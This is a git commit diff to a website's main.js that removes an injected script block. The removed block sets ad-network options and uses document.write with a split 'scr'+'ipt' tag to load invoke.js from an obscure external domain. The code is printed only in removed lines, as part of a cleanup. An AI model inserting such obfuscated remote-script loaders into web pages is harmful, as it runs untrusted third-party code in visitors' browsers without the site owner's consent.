897f3d69fda3ff877d1260fa2817b19fe313d114
Lalib21 <123494440+Lalib21@users.noreply.github.com>
2023-01-26 11:03:57 +0100

    Update main.js

--- main.js
+++ main.js
@@ -1,14 +1,5 @@
 // resize header to size of browser window
-<script type="text/javascript">
-	atOptions = {
-		'key' : 'd615db29b1470c965001f92dddbf2a87',
-		'format' : 'iframe',
-		'height' : 60,
-		'width' : 468,
-		'params' : {}
-	};
-	document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://xhzz3moj1dsd.com/d615db29b1470c965001f92dddbf2a87/invoke.js"></scr' + 'ipt>');
-</script>
+
 var ready = (callback) => {
 	if (document.readyState != "loading") callback();
 	else document.addEventListener("DOMContentLoaded", callback);
